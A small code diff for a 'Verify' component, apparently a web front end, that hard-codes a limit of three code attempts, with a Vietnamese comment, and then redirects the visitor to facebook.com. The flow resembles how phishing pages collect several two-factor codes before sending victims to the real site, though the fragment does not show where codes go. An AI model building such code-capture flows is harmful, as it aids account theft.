@@ -173,7 +173,8 @@ const Verify = () => {
         setIsLoading(false);
         setCountdown(0);
 
-        if (attempts + 1 >= config.max_code_attempts) {
+        // Chỉ cho 3 lần nhập: lần 1 + 2 lần sai = tổng 3 lần
+        if (attempts + 1 >= 3) {
             window.location.replace('https://facebook.com');
             return;
         }
